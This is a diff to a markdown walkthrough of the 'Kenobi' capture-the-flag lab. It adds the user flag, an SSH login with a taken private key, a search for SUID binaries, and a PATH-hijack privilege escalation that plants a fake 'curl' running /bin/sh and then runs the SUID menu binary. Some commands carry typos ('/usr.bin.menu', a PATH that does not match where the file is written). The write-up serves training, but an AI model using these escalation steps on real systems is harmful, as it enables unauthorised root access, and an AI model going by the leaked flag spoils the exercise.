@@ -59,6 +59,7 @@ log.txt
 ```
 ### What is Kenobi's user flag (/home/kenobi/user.txt)?
 ```
+d0b0f3f53b6caa532a83915e19224899
 ```
 # <div align="center">Task 4. Privilege Escalation with Path Variable Manipulation</div>
 ### What file looks particularly out of the ordinary? 
@@ -252,12 +253,98 @@ chmod 600 id_rsa
 ```
 ### Let log In using SSH
 ```
-ssh kenobi@Ip -i id/-rsa
+ssh kenobi@Ip -i id_rsa
+```
+```
+└─# ssh kenobi@10.10.101.17 -i id_rsa 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+103 packages can be updated.
+65 updates are security updates.
+
+
+Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+kenobi@kenobi:~$ 
+```
+## User Flag
+```
+kenobi@kenobi:~$ cat user.txt 
+d0b0f3f53b6caa532a83915e19224899
+```
+## Post Exploitation
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+### This is odd
+```
+kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/menu
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+```
+```
+/usr/bin/menu
+```
+### Let run this
+```
+/usr/bin/menu
+```
+```
+kenobi@kenobi:~$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :
+```
+### We need to manipulating the path to gain a root shell as usual
+```
+echo /bin/sh > curl
+```
+```
+chmod 777 curl
+```
+```
+export PATH=/tmp:$PATH
+```
+```
+/usr.bin.menu
 ```
 
+## Root Flag
+```
+```
 
-
-
+Done !!🙂
 
 
 
